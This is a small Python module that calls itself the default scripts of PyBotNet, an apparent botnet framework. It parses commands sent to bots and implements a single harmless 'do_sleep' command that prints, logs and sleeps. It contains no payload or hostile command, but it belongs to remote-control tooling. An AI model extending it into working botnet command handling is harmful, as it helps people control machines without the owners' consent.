'''Defult PyBotNet scripts'''

from time import sleep

scripts_name = {
    "do_sleep": 'do_sleep <scconds> <message>'
}


def get_command_name(command):
    return command.split(' ')[0]


def is_command(command):
    command_name = get_command_name(command)
    if command_name in scripts_name:
        return True
    return False


def execute_scripts(command, logger):
    command_name = get_command_name(command)

    if is_command(command):
        if command_name == 'do_sleep':
            return execute_do_sleep(command, logger)

    logger.error('invalid command; Wrong format')
    return False


def execute_do_sleep(command, logger):
    comm = command.split(' ')
    try:
        do_sleep(seconds=comm[1], logger=logger, sleep_message=comm[2])
        logger.info('do_sleep done')
        return 'do_sleep done'
    except:
        logger.error('execute_do_sleep invalid command')
        return False


def do_sleep(seconds, logger, sleep_message=''):
    '''
    print sleep message and sleep
    '''
    print(sleep_message)
    logger.info(f'sleep {seconds} second | {sleep_message}')
    sleep(float(seconds))
    logger.info('sleep done')
